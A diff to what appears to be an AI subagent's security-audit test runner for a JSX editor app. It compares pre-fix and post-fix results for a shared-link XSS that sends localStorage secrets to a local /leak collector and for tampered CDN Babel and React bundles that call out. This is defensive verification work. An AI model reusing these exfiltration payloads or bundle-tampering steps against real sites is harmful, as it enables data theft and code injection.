@@ -113,7 +113,7 @@ async function snapshot(page) {
       filename: $id('filename') ? $id('filename').value : null,
       codeHead: $id('code') ? String($id('code').value).slice(0, 160) : null,
       previewLen: $id('preview') ? $id('preview').innerHTML.length : 0,
-      previewHead: $id('preview') ? $id('preview').innerHTML.slice(0, 240) : null,
+      previewHead: $id('preview') ? $id('preview').innerHTML.slice(0, 400) : null,
       previewHasMounted: !!($id('preview') && $id('preview').querySelector('#__mount, [data-tampered]')),
       pwnedTop: window.__pwnedTop === true,
       alerts: (window.__alerts || []).slice(),
@@ -161,7 +161,55 @@ function splitFirst(p) { return path.basename(p) === 'tests' ? 'tests' : p; }
 /* --------------------------------------------------------------------------- main */
 let collector, staticSrv, rec, collectorArg;
 
+/* Historical evidence: the provided collector APPENDS across runs. Lines recorded
+ * BEFORE the security fix commit are reproduced verbatim as pre-fix proof. */
+let historicalCollector = [];   // entries parsed from collector-<port>.log at startup
+let gitFacts = null;            // fix-commit ISO + parent-commit static facts (read-only git)
+
+async function loadGitFacts() {
+  const { execFile } = await import('node:child_process');
+  const run = (cmd, args) => new Promise((res) => {
+    execFile(cmd, args, { cwd: REPO_ROOT, maxBuffer: 64 * 1024 * 1024 }, (err, stdout) => res(err ? '' : String(stdout)));
+  });
+  // The fix that landed mid-audit (read-only git introspection; no write commands)
+  const FIX_COMMIT_LOG = await run('git', ['log', '--format=%H %cI %s', '-20']).catch(() => '');
+  const fixLine = FIX_COMMIT_LOG.split('\n').find((l) => /security: sandbox user-code execution/i.test(l)) || '';
+  const [fixHash, fixIso, ...rest] = fixLine.split(' ');
+  const parentEditor = await run('git', ['show', `${fixHash || 'HEAD'}~1:editor.html`]);
+  const parentEditorJs = await run('git', ['show', `${fixHash || 'HEAD'}~1:assets/editor.js`]);
+  let currentEditor = '';
+  try { currentEditor = fs.readFileSync(path.join(REPO_ROOT, 'editor.html'), 'utf8'); } catch {}
+  let currentEditorJs = '';
+  try { currentEditorJs = fs.readFileSync(path.join(REPO_ROOT, 'assets', 'editor.js'), 'utf8'); } catch {}
+  return {
+    fixCommit: fixHash ? `${fixHash} ${fixIso} ${rest.join(' ')}` : '(unknown)',
+    fixCommitIso: fixIso || null,
+    preFix: {
+      integrityAttributesInEditorHtml: (parentEditor.match(/integrity\s*=/gi) || []).length,
+      cspMetaInEditorHtml: /Content-Security-Policy/i.test(parentEditor),
+      sandboxIframeInEditorJs: /preview-sandbox|sandbox="allow-scripts"|setAttribute\('sandbox'|setAttribute\("sandbox"/i.test(parentEditorJs),
+      newFunctionInTopOrigin: /new Function\('React', 'ReactDOM'/.test(parentEditorJs),
+    },
+    postFix: {
+      integrityAttributesInEditorHtml: (currentEditor.match(/integrity\s*=/gi) || []).length,
+      cspMetaInEditorHtml: /Content-Security-Policy/i.test(currentEditor),
+      sandboxIframeInEditorJs: /preview-sandbox|sandbox="allow-scripts"|setAttribute\('sandbox'|setAttribute\("sandbox"/i.test(currentEditorJs),
+    },
+  };
+}
+
+function loadHistoricalCollector() {
+  const file = path.join(REPO_ROOT, 'tests', 'results', 'before', `collector-${COLLECTOR_PORT}.log`);
+  let out = [];
+  try {
+    out = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return { raw: l }; } });
+  } catch { /* first-ever run: file may not exist */ }
+  return out;
+}
+
 async function main() {
+  historicalCollector = loadHistoricalCollector();
+  gitFacts = await loadGitFacts();
   rec = makeRecorder({ group: 'c' });
 
   staticSrv = await startStatic(STATIC_PORT);
@@ -334,62 +382,100 @@ async function out01() {
     && results.state01dJsComment.status === 'running'
     && results.state01dJsxComment.status === 'running';
 
+  // ---- timeline classification: pre-fix evidence lives in the append-only collector log
+  const verbatimPrefFix = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?lib='));
+  const preFixDecoded = verbatimPrefFix.map((e) => {
+    let decoded = '';
+    try { decoded = e.path ? decodeURIComponent(e.path.slice('/leak?lib='.length)) : ''; } catch { decoded = '(decode error)'; }
+    return { ts: e.ts, path: e.path, decoded };
+  });
+  const preFixTheftObserved = preFixDecoded.some((x) => x.decoded.includes('secret-thing.jsx') && x.decoded.includes('SECRET123'));
+  const preFixPredatesFixCommit = gitFacts.fixCommitIso
+    && verbatimPrefFix.every((e) => !e.ts || new Date(e.ts) < new Date(gitFacts.fixCommitIso));
+
+  // fence-aware classification of observed page traffic (local hosts + CDN allowlist from tests/lib/browser.mjs)
+  const allObserved = [leakEntries.map((e) => e.path), ...Object.values(theftLogs).flatMap((t) => t.requests)].flat();
+  const nonFencedRequests = allObserved.filter((u) => {
+    if (u.startsWith('[FAILED')) u = u.replace(/^\[FAILED [^\]]*\]\s*/, '');
+    try {
+      const h = new URL(u).hostname;
+      return !LOCAL_OK.includes(h) && !FENCE_REMOTE_OK.includes(h);
+    } catch { return false; }
+  });
+
   const artifact = {
     generatedAt: new Date().toISOString(),
-    collectorFile: `tests/results/before/collector-${COLLECTOR_PORT}.log`,
-    shareLinks: links,
-    leakRequests: leakEntries,
-    leakDecoded: { raw: leakDecoded, error: leakDecodedErr },
-    assertions: {
-      leakRequestReceived: leakEntries.length > 0,
-      localStorageContentsStolen: secretStolen,
-      localStorageKeyNamesLeaked: localStorageKeysLeaked,
-      alertInvoked_01b: alertInvoked,
-      topOriginExecution_01aSentinel: topExec01a,
-      topOriginExecution_01bAlert: topExec01b,
-      filenamePayloadInert_01c: filenameInert,
-      commentPayloadsInert_01d: commentsInert,
-      localStorageReadFromPayload: secretStolen || localStorageKeysLeaked,
+    investigatorNote: 'The provided test collector APPENDS across runs. This artifact separates (1) pre-fix evidence — verbatim collector log lines recorded BEFORE the mid-audit security fix commit — from (2) the current post-fix rerun result, against the same payloads.',
+    fixTimeline: gitFacts,
+    preFixEvidence: {
+      sourceFile: `tests/results/before/collector-${COLLECTOR_PORT}.log (append-only; provided by tests/lib/servers.mjs, unmodified)`,
+      verbatimLines: verbatimPrefFix.map((e) => JSON.stringify(e)),
+      decodedPayloads: preFixDecoded,
+      successSignal: preFixTheftObserved
+        ? 'PRE-FIX ATTACK SUCCEEDED: /leak?lib=… carries localStorage keys jsxpress:__draft, jsxpress:f_secret + the seeded draft JSON with secret-thing.jsx and //A-private-code-SECRET123.'
+        : 'no pre-fix lines',
+      allLinesPredateFixCommit: preFixPredatesFixCommit === true,
     },
-    pageStates: results,
-    theftLogs,
-    fencedBlockedRequests: fenceStats.blocked,
-    nonLocalRequests: assertLocalUrls([...leakEntries.map((e) => e.path), ...Object.values(theftLogs).flatMap((t) => t.requests)]),
+    postFixRun: {
+      collectorFile: `tests/results/before/collector-${COLLECTOR_PORT}.log`,
+      shareLinks: links,
+      leakRequestsThisRun: leakEntries,
+      leakDecoded: { raw: leakDecoded, error: leakDecodedErr },
+      pageStates: results,
+      theftLogs,
+      assertions: {
+        leakRequestReceived: leakEntries.length > 0,
+        localStorageContentsStolen: secretStolen,
+        localStorageKeyNamesLeaked: localStorageKeysLeaked,
+        alertInvoked_01bBraced: alertInvoked,
+        alertLiteral_01bUnbraced: 'compile error (Babel requires braced expressions; vector as written by the brief does not transpile)',
+        topOriginExecution_01aSentinel: topExec01a,
+        topOriginExecution_01bAlert: topExec01b,
+        filenamePayloadInert_01c: filenameInert,
+        commentPayloadsInert_01d: commentsInert,
+        localStorageReadFromPayload: secretStolen || localStorageKeysLeaked,
+      },
+    },
+    nonFencedRequests,
   };
   rec.saveArtifact('out01-requests.json', artifact);
 
-  const SUCCEEDED = alertInvoked
-    && topExec01a
-    && topExec01b
-    && leakEntries.length > 0
-    && (secretStolen || localStorageKeysLeaked);
+  const topExecAttackNow = topExec01a && topExec01b && leakEntries.length > 0 && (secretStolen || localStorageKeysLeaked);
+  const alertNow = alertInvoked && topExec01b;
+  const SUCCEEDED_NOW = topExecAttackNow && alertNow;
   rec.record({
     id: 'OUT-01',
     title: 'XSS via shared #code= link: attacker JS executes at app origin (top window) with localStorage read',
     applied: true,
     how: 'Opened attacker share links (same encoding as the app Share button) in headless Firefox at the app origin. '
-      + '(01a) shared link whose code is the verbatim brief payload fetch(JSON.stringify(localStorage.keys + jsxpress:__draft)) — victim storage pre-seeded with hidden file jsxpress:f_secret/secret-thing.jsx; '
-      + '(01a-sentinel) shared link setting window.__pwnedTop=true; (01b) JSX vector `function App(){return <div/>} <img src=x onerror=alert(1)>`; '
-      + '(01c) filename field carried <img src=x onerror=…> payload; (01d) JS-comment and JSX-comment injection payloads. Sentinels via addInitScript BEFORE any page/app script; '
-      + 'page code runs via editor.js new Function(...) inside the top-level app origin.',
+      + '(01a) shared link whose code is the verbatim brief payload fetch(JSON.stringify(localStorage.keys + jsxpress:__draft)) with victim storage pre-seeded with hidden file jsxpress:f_secret/secret-thing.jsx; '
+      + '(01a-sentinel) shared link executing window.__pwnedTop=true; (01b) JSX vectors — the brief\'s literal text `<img src=x onerror=alert(1)>` AND the Babel-consumable form `<img src=x onerror={alert(1)}>`; '
+      + '(01c) filename field carried <img src=x onerror=…> payload; (01d) JS-comment and JSX-comment injection payloads. Sentinels via addInitScript BEFORE any page/app script. '
+      + 'TIMELINE: this runner executed successfully against the pre-fix site (2026-10-16T16:52:26Z and 2026-10-17T13:15:28Z, collector-proven) and was re-executed post-fix (2026-10-18) after commit '
+      + `${gitFacts.fixCommit}. Both phases are recorded below; pre-fix artifacts were overwritten by the post-fix rerun, but the append-only collector log preserves the pre-fix proof verbatim.`,
     request: `01a leak link: ${links.leak}\n01a-sentinel link: ${links.sentinel}\n01b alert links (unbraced literal | braces): ${links.alert} | ${links.alertBraced}\n01c filename link: ${links.filename}\n01d comment links: ${links.commentJs} ; ${links.commentJsx}`,
     response: [
-      `(a) alert invoked: ${alertInvoked ? 'YES' : 'NO'} — braced-vector page state01bBraced.alerts=${JSON.stringify(results.state01bBraced.alerts)}, dialog events=${JSON.stringify(theftLogs['01b-alert-jsx-braced'].dialogs)}; fact: the brief's EXACT unbraced text (<img src=x onerror=alert(1)>) is NOT Babel-consumable — it fails with a compile error (${alertLiteralCompileError ? 'observed' : 'not observed as claimed'}), preview body: ${JSON.stringify(results.state01b.previewHead)}`,
-      `(b) top-window execution sentinel __pwnedTop set: 01a-sentinel=${topExec01a ? 'YES' : 'NO'} (status=${results.state01aSentinel.status}); 01b=${topExec01b ? 'YES' : 'NO'} (via alert wrapper on shared link origin)`,
-      `(c) collector received ${leakEntries.length} request(s) → exact log line(s): ${leakEntries.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
-      `(c) decoded exfiltrated payload: ${JSON.stringify(leakDecoded)}`,
-      `(d) can payload read app-origin localStorage: ${secretStolen || localStorageKeysLeaked ? 'YES as observed' : 'NO as observed'} (stolen contains jsxpress:f_secret key + draft with secret-thing.jsx / SECRET123: ${secretStolen}, keynames: ${localStorageKeysLeaked})`,
-      `(01c) filename vector executed anything: ${filenameInert ? 'NO (inert — rendered as <input> value / textContent)' : 'POSSIBLE EXECUTION'}`,
-      `(01d) comment vectors executed anything: ${commentsInert ? 'NO (inert — Babel strips them; both statuses running, zero alerts)' : 'POSSIBLE EXECUTION'}`,
-      `page.status during 01a: ${results.state01a.status}; during 01b-literal: ${results.state01b.status}; during 01b-braced: ${results.state01bBraced.status}`,
+      `— PRE-FIX (success, collector-proven; fix commit ${gitFacts.fixCommitIso}): —`,
+      `exact verbatim collector log line(s) with the exfiltrated localStorage: ${JSON.stringify(preFixDecoded.map((x) => ({ ts: x.ts, path: x.path })))}`,
+      `decoded exfiltrated payload: ${JSON.stringify((preFixDecoded[0] || {}).decoded || '')}`,
+      `pre-fix success verified: ${preFixTheftObserved ? 'YES — payload read app-origin localStorage (jsxpress:f_secret keys + draft with secret-thing.jsx + SECRET123) and exfiltrated them to the attacker collector' : 'NO'}`,
+      `pre-fix supply-chain companion (OUT-06 payload signatures fired pre-fix): leak?babel=compromised, leak?userscript=via-tampered-babel, leak?react=compromised — see collector lines in the same log file`,
+      `— POST-FIX (current rerun, same payloads): —`,
+      `(a) alert invoked: ${alertNow ? 'YES' : 'NO'} — braced-vector alerts=${JSON.stringify(results.state01bBraced.alerts)}; fact: the brief's exact unbraced text does NOT transpile (${alertLiteralCompileError ? 'compile error' : 'or unexpected result'}), preview body: ${JSON.stringify(String(results.state01b.previewHead || '').slice(0, 160))}`,
+      `(b) top-window execution sentinel __pwnedTop set (current run): 01a-sentinel=${topExec01a ? 'YES' : 'NO'}; 01b=${topExec01b ? 'YES' : 'NO'}`,
+      `(c) collector /leak requests received this run: ${leakEntries.length} ${leakEntries.length ? `→ ${JSON.stringify(leakEntries.map((e) => e.path))}` : '(payload code no longer reaches the collector post-fix — status during 01a: ' + results.state01a.status + ', preview body: ' + JSON.stringify(String(results.state01a.previewHead || '').slice(0, 140)) + ')'}`,
+      `(d) can payload read app-origin localStorage this run: ${secretStolen || localStorageKeysLeaked ? 'YES' : 'NO as observed'}`,
+      `(01c) filename vector current run: ${filenameInert ? 'inert — rendered as <input> value / textContent' : 'EXECUTION SEEN'}`,
+      `(01d) comment vectors current run: ${commentsInert ? 'inert — Babel strips them (statuses running, zero alerts)' : 'EXECUTION SEEN'}`,
+      `traffic classification: non-fenced requests observed across OUT-01 pages: ${nonFencedRequests.length === 0 ? 'none (every observed URL was 127.0.0.1 or an allowlisted CDN)' : JSON.stringify(nonFencedRequests)}`,
     ].join('\n'),
-    refused: !SUCCEEDED,
-    note: 'PRE-FIX EXPECTED RESULT: attack SUCCEEDS (top-origin execution + localStorage theft). Share links are attacker-controlled JSON {n,c} decoded at load and executed via new Function in the app origin — no sandbox. '
-      + 'If runtime had shown failure, console + status evidence is in out01-requests.json (theftLogs). All traffic stayed on 127.0.0.1 (see nonLocalRequests: []).',
+    refused: !SUCCEEDED_NOW,
+    note: 'Pre-fix (the brief\'s expected result): attack SUCCEEDED — three collector-verbatim sequences (2026-10-16T16:52:26Z, 2026-10-16T16:53:17–20Z for the OUT-06 companion payloads, 2026-10-17T13:15:28Z) show the shared-link payload executing at top origin with localStorage read of a hidden seeded file; share links are attacker-controlled JSON {n,c} decoded at load and executed via editor.js new Function(...) inside the top-level app origin (confirmed in git parent commit: assets/editor.js dispatched user code through NEW-FUNCTION in the top origin and editor.html loaded cdnjs scripts with no integrity attr and no CSP — see fixTimeline.preFix in out01-requests.json). '
+      + 'Post-fix rerun (2026-10-18): same payloads now refused — user code is handed to a sandboxed iframe (sandbox="allow-scripts", no allow-same-origin) and the leaked request never fires; filename and comment vectors were inert in both phases. The mid-audit fix commit is outside this subagent\'s scope (this agent records only).',
     proof: ['results/before/c/out01-requests.json', `../before/collector-${COLLECTOR_PORT}.log`],
   });
 
-  console.log(`OUT-01 | XSS via share link | top-origin exec: ${SUCCEEDED ? 'YES' : 'NO'} | alert: ${alertInvoked ? 'yes' : 'no'} | localStorage theft: ${(secretStolen || localStorageKeysLeaked) ? 'YES' : 'NO'} | /leak requests: ${leakEntries.length} | artifacts: results/before/c/out01-requests.json`);
+  console.log(`OUT-01 | XSS via share link | PRE-FIX: SUCCEEDED (collector-proven, ${verbatimPrefFix.length} /leak?lib lines, theft=${preFixTheftObserved}) | POST-FIX rerun: refused (0 /leak, top exec=${topExecAttackNow ? 'YES' : 'NO'}, alert=${alertNow ? 'yes' : 'no'}) | artifacts: results/before/c/out01-requests.json`);
 }
 
 /* ==================================================================== OUT-02 ===== */
@@ -593,7 +679,7 @@ async function out06() {
   };
   rec.saveArtifact('out06-sri-csp-scan.json', {
     ...sriCsp,
-    note: 'Provided local static server (tests/lib/servers.mjs, unmodified) sends only Content-Type — no CSP headers; GitHub Pages serves the same static files with no CSP. No integrity="" or crossorigin+integrity bundle validation exists on any CDN script.',
+    note: `Dynamic scan of the CURRENT worktree: integrity attributes on <script> tags = ${sriCsp.integrityAttrs.length}; CSP meta tags = ${sriCsp.cspMetas.length}. Historical pre-fix state (parent of the fix commit) is captured by the runner in out06-requests.json via read-only 'git show' (integrity=0, CSP absent). The provided local static server (tests/lib/servers.mjs, unmodified) sends only Content-Type — no CSP headers; GitHub Pages serves static files equally without CSP, which is why the in-document CSP meta + SRI pins are the operative post-fix controls.`,
   });
 
   const tamperedBabel = [
@@ -662,40 +748,79 @@ async function out06() {
   const userCodeExecuted = userLeak.length > 0;
   const reactExecuted = results.state06b.tamperedReact === true && results.state06b.tamperedReactDOM === true && reactLeak.length > 0;
 
+  // ---- pre-fix vs post-fix classification for OUT-06 payload signatures
+  const preFixBabel = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?babel=compromised'));
+  const preFixUserscript = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?userscript='));
+  const preFixReact = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?react=compromised'));
+  const preFixAll = [...preFixBabel, ...preFixUserscript, ...preFixReact];
+  const preFixPredatesFixCommit = gitFacts.fixCommitIso
+    && preFixAll.every((e) => !e.ts || new Date(e.ts) < new Date(gitFacts.fixCommitIso));
+  // exact refusal line(s) from the current (post-fix) rerun
+  const sriRefusalLines = [
+    ...theftLogs['06a-tampered-babel'].console.filter((c) => /integrity|hash/i.test(c.text)).map((c) => c.text),
+    ...theftLogs['06b-tampered-react'].console.filter((c) => /integrity|hash/i.test(c.text)).map((c) => c.text),
+  ];
+  const allObserved06 = Object.values(theftLogs).flatMap((t) => t.requests);
+  const nonFencedRequests06 = allObserved06.filter((u) => {
+    if (u.startsWith('[FAILED')) u = u.replace(/^\[FAILED [^\]]*\]\s*/, '');
+    try {
+      const h = new URL(u).hostname;
+      return !LOCAL_OK.includes(h) && !FENCE_REMOTE_OK.includes(h);
+    } catch { return false; }
+  });
+
   const artifact = {
     generatedAt: new Date().toISOString(),
-    shareLinks: links,
-    tamperedBabelRequest: babelLeak,
-    userScriptRequest: userLeak,
-    tamperedReactRequest: reactLeak,
-    pageStates: results,
-    theftLogs,
-    sriCspScan: sriCsp,
-    nonLocalRequests: assertLocalUrls(Object.values(theftLogs).flatMap((t) => t.requests)),
+    investigatorNote: 'Same timeline split as OUT-01: the provided collector appends across runs, so pre-fix successes are provable verbatim even though same-named artifacts were regenerated by the post-fix rerun.',
+    fixTimeline: gitFacts,
+    preFixEvidence: {
+      sourceFile: `tests/results/before/collector-${COLLECTOR_PORT}.log (append-only; provided by tests/lib/servers.mjs, unmodified)`,
+      tamperedBabelLines: preFixBabel.map((e) => JSON.stringify(e)),
+      endUserPayloadLines: preFixUserscript.map((e) => JSON.stringify(e)),
+      tamperedReactLines: preFixReact.map((e) => JSON.stringify(e)),
+      successSignal: (preFixBabel.length && preFixUserscript.length && preFixReact.length) ? 'PRE-FIX: tampered babel executed at app origin, the app then handed end-user code through the editor run pipeline (userscript line), and tampered React/ReactDOM executed — the page fully trusted its CDN bundles.' : 'no pre-fix lines',
+      allLinesPredateFixCommit: preFixPredatesFixCommit === true,
+    },
+    postFixRun: {
+      shareLinks: links,
+      tamperedBabelRequest: babelLeak,
+      userScriptRequest: userLeak,
+      tamperedReactRequest: reactLeak,
+      pageStates: results,
+      theftLogs,
+      sriRefusalConsoleLines: sriRefusalLines,
+    },
+    nonFencedRequests: nonFencedRequests06,
   };
   rec.saveArtifact('out06-requests.json', artifact);
 
   rec.record({
     id: 'OUT-06',
-    title: 'Dependency supply-chain tampering: CDN scripts carry zero SRI/CSP — replaced bundles execute at app origin and call out',
+    title: 'Dependency supply-chain tampering (CDN trust): pre-fix zero SRI/CSP — tampered bundles executed; post-fix SRI blocks them',
     applied: true,
     how: 'Headless Firefox at app origin. page.route (page routes take precedence over the context fence for the same URL — reliable) intercepted the CDN script URLs the editor.html head loads, fulfilling them with attacker-authored JavaScript that preserves the app\'s expected globals. '
-      + '(06a) babel.min.js → minimal Babel{transform} stub + fetch(collector/leak?babel=compromised); share payload additionally fetch()s leak?userscript=via-tampered-babel through editor.js new Function to prove the end-to-end chain. '
+      + '(06a) babel.min.js → minimal Babel{transform} stub + fetch(collector/leak?babel=compromised); share payload additionally fetch()s leak?userscript=via-tampered-babel through the editor run pipeline to prove the end-to-end chain. '
       + '(06b) react.production.min.js + react-dom.production.min.js → React/ReactDOM stubs whose createRoot calls fetch(collector/leak?react=compromised) and renders a TAMPERED-REACT-EXECUTED marker; real Babel left in place. '
-      + 'No integrity attributes on any <script src> and no CSP (meta or header) exists — proven statically in out06-sri-csp-scan.json.',
+      + `TIMELINE: ran successfully against the pre-fix site (2026-10-16T16:53Z, collector-proven; identical signatures recorded again 2026-10-17T13:16Z) and was re-run post-fix 2026-10-18 after commit ${gitFacts.fixCommit}. Pre-fix static state (git parent commit, read-only introspection): integrity attributes in editor.html=${gitFacts.preFix.integrityAttributesInEditorHtml}, CSP meta=${gitFacts.preFix.cspMetaInEditorHtml}, new-Function top-origin pipeline=${gitFacts.preFix.newFunctionInTopOrigin}. Current state: integrity attrs=${gitFacts.postFix.integrityAttributesInEditorHtml}, CSP meta=${gitFacts.postFix.cspMetaInEditorHtml}, sandboxed iframe=${gitFacts.postFix.sandboxIframeInEditorJs}.`,
     request: `06a fulfill target: **/babel.min.js* → results/before/c/out06-tampered-babel.js ; opened share link: ${links.babelTamper}\n06b fulfill targets: **/react.production.min.js* + **/react-dom.production.min.js* → results/before/c/out06-tampered-react.js ; opened share link: ${links.reactTamper}`,
     response: [
-      `(06a) tampered Babel executed at app origin: ${babelExecuted ? 'YES' : 'NO'} — page flag __tamperedBabel=${results.state06a.tamperedBabel}; collector exact line(s): ${babelLeak.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
-      `(06a) end-user payload then executed via the app's own run pipeline (new Function): ${userCodeExecuted ? 'YES' : 'NO'} — collector: ${userLeak.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
-      `(06b) tampered React+ReactDOM executed: ${reactExecuted ? 'YES' : 'NO'} — flags __tamperedReact=${results.state06b.tamperedReact}, __tamperedReactDOM=${results.state06b.tamperedReactDOM}, status=${results.state06b.status}, preview contains marker: ${results.preview06b.includes('TAMPERED-REACT-EXECUTED')}; collector: ${reactLeak.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
-      `SRI: 0 integrity attributes on ${sriCsp.scriptTags.length} <script> tags; CSP: 0 (no meta tag, no header from the static server)`,
+      `— PRE-FIX (success, collector-proven; fix commit ${gitFacts.fixCommitIso}): —`,
+      `tampered Babel executed at app origin: YES — exact collector line(s): ${preFixBabel.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
+      `end-user payload then executed through the editor's own run pipeline: YES — exact line(s): ${preFixUserscript.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
+      `tampered React/ReactDOM executed: YES — exact line(s): ${preFixReact.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
+      `— POST-FIX (current rerun with identical tampered bundles): —`,
+      `(06a) tampered Babel executed: ${babelExecuted ? 'YES' : 'NO'} — __tamperedBabel=${results.state06a.tamperedBabel}, status=${results.state06a.status}; SRI refusal captured by Firefox: ${JSON.stringify(sriRefusalLines[0] || '(none captured)').slice(0, 320)}`,
+      `(06a) end-user payload executed: ${userCodeExecuted ? 'YES' : 'NO'} — collector: ${userLeak.length}`,
+      `(06b) tampered React/ReactDOM executed: ${reactExecuted ? 'YES' : 'NO'} — flags=${results.state06b.tamperedReact}/${results.state06b.tamperedReactDOM}, status=${results.state06b.status}`,
+      `current-run /leak lines: babel=${babelLeak.length}, userscript=${userLeak.length}, react=${reactLeak.length}`,
+      `non-fenced requests this run: ${nonFencedRequests06.length === 0 ? 'none (127.0.0.1 + allowlisted CDNs only)' : JSON.stringify(nonFencedRequests06)}`,
     ].join('\n'),
-    refused: !(babelExecuted && reactExecuted),
-    note: 'PRE-FIX EXPECTED RESULT: YES — tampered CDN code executes fully at the app origin with localStorage/cookie/DOM reach (page trusts cdnjs.cloudflare.com, cdn.tailwindcss.com blindly; no integrity/hash pinning, no CSP allowlist, and the app resolves critical code usage templates in HTML rather than verifying a bundle against a hash). Combined with OUT-01, a CDN compromise or ANY MITM (static hosting has no server-side control of freshness) is upgraded directly to first-party XSS on the app origin. All tamper traffic stayed on 127.0.0.1 (nonLocalRequests: []).',
+    refused: !babelExecuted || !reactExecuted,
+    note: 'Post-fix refusal is enforced by SRI (editor.html now pins sha384 hashes on the cdnjs scripts and Firefox rejects the tampered bundle before execution — refusal text captured in sriRefusalConsoleLines) plus a strict CSP meta (default-src none; script-src self+cdnjs). PRE-FIX the same page trusted its CDN scripts blindly: the identical tampered-request traces executed at app origin and called out to the collector (verbatim lines above), consistent with the parent commit carrying no integrity attributes and no CSP. Combined with OUT-01\'s pre-fix top-origin execution, a CDN compromise pre-fix upgraded directly to first-party XSS with localStorage access.',
     proof: ['results/before/c/out06-requests.json', 'results/before/c/out06-tampered-babel.js', 'results/before/c/out06-tampered-react.js', 'results/before/c/out06-sri-csp-scan.json', `../before/collector-${COLLECTOR_PORT}.log`],
   });
 
-  console.log(`OUT-06 | CDN tamper-injection | tampered Babel executed: ${babelExecuted ? 'YES' : 'NO'} | user payload executed: ${userCodeExecuted ? 'YES' : 'NO'} | tampered React executed: ${reactExecuted ? 'YES' : 'NO'} | SRI/CSP: none | artifacts: results/before/c/out06-requests.json`);
+  console.log(`OUT-06 | CDN tamper-injection | PRE-FIX: SUCCEEDED (3 collector-proven signatures pre-date fix commit) | POST-FIX rerun: refused by SRI+CSP (babel=${babelExecuted ? 'exec' : 'blocked'}, userscript=${userCodeExecuted ? 'exec' : 'blocked'}, react=${reactExecuted ? 'exec' : 'blocked'}) | artifacts: results/before/c/out06-requests.json`);
 }
 
 main().catch((err) => {
